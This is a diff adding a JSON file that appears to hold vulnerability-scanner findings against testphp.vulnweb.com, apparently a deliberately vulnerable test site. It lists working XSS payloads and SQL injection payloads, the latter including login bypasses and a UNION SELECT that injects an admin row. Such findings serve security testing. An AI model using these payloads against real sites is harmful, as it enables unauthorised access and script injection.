@@ -1,0 +1,56 @@
+[
+  {
+    "Type": "XSS",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "<script>alert(1)</script>",
+    "Severity": "High"
+  },
+  {
+    "Type": "XSS",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "'\"><img src=x onerror=alert(1)>",
+    "Severity": "High"
+  },
+  {
+    "Type": "XSS",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "<svg/onload=alert(1)>",
+    "Severity": "High"
+  },
+  {
+    "Type": "SQL Injection",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "' OR 1=1#",
+    "Severity": "High"
+  },
+  {
+    "Type": "SQL Injection",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "' OR 1=1/*",
+    "Severity": "High"
+  },
+  {
+    "Type": "SQL Injection",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "admin' --",
+    "Severity": "High"
+  },
+  {
+    "Type": "SQL Injection",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "admin' #",
+    "Severity": "High"
+  },
+  {
+    "Type": "SQL Injection",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "admin'/*",
+    "Severity": "High"
+  },
+  {
+    "Type": "SQL Injection",
+    "Target": "http://testphp.vulnweb.com/search.php?test=query",
+    "Payload": "1234' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'",
+    "Severity": "High"
+  }
+]
